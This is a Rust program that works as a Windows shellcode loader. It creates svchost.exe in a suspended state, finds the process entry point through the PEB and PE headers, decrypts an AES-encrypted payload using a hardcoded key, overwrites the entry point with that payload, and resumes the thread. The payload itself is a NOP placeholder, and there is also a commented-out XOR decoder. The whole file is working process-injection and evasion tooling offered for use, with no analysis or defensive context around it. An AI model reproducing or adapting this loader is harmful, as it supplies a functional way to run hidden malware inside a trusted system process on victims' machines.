use std::{
    ptr::{
        null_mut,
    },
    mem::{
        size_of,
    },
    ffi::{
        CString,
    }, 
};

use libaes::Cipher;
use winapi::{
    shared::{
        ntdef::{
            PSTR, NT_SUCCESS
        },
    }, 
    um::{
        processthreadsapi::{
            CreateProcessA,
            STARTUPINFOA,
            PROCESS_INFORMATION,
        },
        winbase::{
            CREATE_SUSPENDED,
        },
        errhandlingapi::{
            GetLastError,
        }, 
        winnt::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, PAGE_READWRITE,
        }, handleapi::CloseHandle,
    },
    ctypes::{
        c_void
    }
};

use ntapi::{
    ntpsapi::{
        PROCESS_BASIC_INFORMATION,
        PROCESSINFOCLASS, NtQueryInformationProcess, NtResumeThread,
    }, ntmmapi::{NtWriteVirtualMemory, NtReadVirtualMemory, NtProtectVirtualMemory}
};

fn main() {
    let lp_application_name: PSTR = null_mut();
    let lp_command_line = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw();
    //let lp_current_directory: PSTR = null_mut();
    let mut startup_info = STARTUPINFOA::default();
    let mut process_information = PROCESS_INFORMATION::default();

    let create_process_result = unsafe { CreateProcessA(
        lp_application_name,
        lp_command_line, 
        null_mut(), 
        null_mut(), 
        0, 
        CREATE_SUSPENDED,
        null_mut(), 
        null_mut(), 
        &mut startup_info, 
        &mut process_information) };

    if create_process_result == 0 {
        panic!("[-] Failed to call CreateProcessA {:?}", unsafe { GetLastError() });
    }

    let process_handle = process_information.hProcess;
    let thread_handle = process_information.hThread;
    let mut process_basic_information = PROCESS_BASIC_INFORMATION::default();
    let process_information_class = PROCESSINFOCLASS::default();

    let status = unsafe { NtQueryInformationProcess(
        process_handle, 
        process_information_class,  
        &mut process_basic_information as *mut _ as *mut c_void,
        size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
        null_mut()
    ) };
    
    if !NT_SUCCESS(status) {
        panic!("[-] Failed to call NtQueryInformationProcess: {:#x}", status);
    }

    let image_base_offset = process_basic_information.PebBaseAddress as u64 + 0x10;    
    let mut image_base_buffer = [0; size_of::<&u8>()];

    let status = unsafe { NtReadVirtualMemory(
        process_handle,
        image_base_offset as *mut c_void,
        image_base_buffer.as_mut_ptr() as _,
        image_base_buffer.len(),
        null_mut()
    ) };

    if !NT_SUCCESS(status) {
        panic!("[-] Failed to get ImageBaseAddress via NtReadVirtualMemory: {:#x}", status);
    }

    let image_base_address = usize::from_ne_bytes(image_base_buffer);
    println!("[+] ImageBaseAddress: {:#x}", image_base_address);

    let mut dos_header = IMAGE_DOS_HEADER::default();

    let status = unsafe { NtReadVirtualMemory(
        process_handle,
        image_base_address as *mut c_void,
        &mut dos_header as *mut _ as _,
        std::mem::size_of::<IMAGE_DOS_HEADER>(),
        null_mut()
    ) };

    
    if !NT_SUCCESS(status) {
        panic!("[-] Failed to get IMAGE_DOS_HEADER via NtReadVirtualMemory: {status}");
    } else if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        panic!("[-] Error: IMAGE_DOS_HEADER is invalid")
    }

    let mut nt_header = IMAGE_NT_HEADERS64::default();

    let status = unsafe { NtReadVirtualMemory(
        process_handle,
        (image_base_address + dos_header.e_lfanew as usize) as *mut c_void,
        &mut nt_header as *mut _ as _,
        std::mem::size_of::<IMAGE_NT_HEADERS64>(),
        null_mut()
    ) };

    if !NT_SUCCESS(status) {
        panic!("[-] Failed to get IMAGE_NT_HEADERS64 via NtReadVirtualMemory: {:#x}", status);
    } else if nt_header.Signature != IMAGE_NT_SIGNATURE {
        panic!("[-] Error: IMAGE_NT_HEADER is invalid");
    }

    let entry_point = image_base_address as usize + nt_header.OptionalHeader.AddressOfEntryPoint as usize;
    println!("[+] AddressOfEntryPoint: {:#x}", entry_point);

    //xor encrypted shellcode goes here.
    //let xor_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
    //let mut shellcode: Vec<u8> = xor_decode(&encoded_shellcode, 0xDA);

    //aes encrypted shellcode goes here
    let aes_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
    let mut shellcode: Vec<u8> = aes_256_decrypt(&aes_shellcode, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337", b"This is 16 bytes");


    //Change memory protection to PAGE_READWRITE
    let mut base_address = entry_point as *mut c_void;
    let mut buffer_length = shellcode.len();
    let mut bytes_written = 0;
    let mut old_protect: u32 = 0;
    let status = unsafe { NtProtectVirtualMemory(process_handle, &mut base_address, &mut buffer_length, PAGE_READWRITE, &mut old_protect) };

    if !NT_SUCCESS(status) {
        panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", status);
    }
    
    let base_address = entry_point as *mut c_void;
    let buffer = shellcode.as_mut_ptr() as *mut c_void;
    let buffer_length = shellcode.len();
    let status = unsafe { NtWriteVirtualMemory(process_handle, base_address, buffer, buffer_length, &mut bytes_written) };


    if !NT_SUCCESS(status) {
        panic!("[-] Failed to call NtWriteVirtualMemory: {:#x}", status);
    }

    //Restore memory protections to PAGE_READONLY
    let mut base_address = entry_point as *mut c_void;
    let mut buffer_length = shellcode.len();
    let mut temp = 0;
    let status = unsafe { NtProtectVirtualMemory(process_handle, &mut base_address, &mut buffer_length,  old_protect, &mut temp) };

    if !NT_SUCCESS(status) {
        panic!("[-] Failed to call NtProtectVirtualMemory and restore memory protection: {:#x}", status);
    }

    let mut suspend_count: u32 = 0;
    let status = unsafe { NtResumeThread(thread_handle, &mut suspend_count) };

    if !NT_SUCCESS(status) {
        panic!("[-] Failed to call NtResumeThread: {:#x}", status);
    }

    unsafe {
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

/* 
fn xor_decode(shellcode: &Vec<u8>, key: u8) -> Vec<u8> {
    shellcode.iter().map(|x| x ^ key).collect()
}
*/

fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    // Create a new 128-bit cipher
    let cipher = Cipher::new_256(key);    
    
    //Decryption
    let decrypted = cipher.cbc_decrypt(iv, &shellcode);

    decrypted
}

/*
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

/// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}*/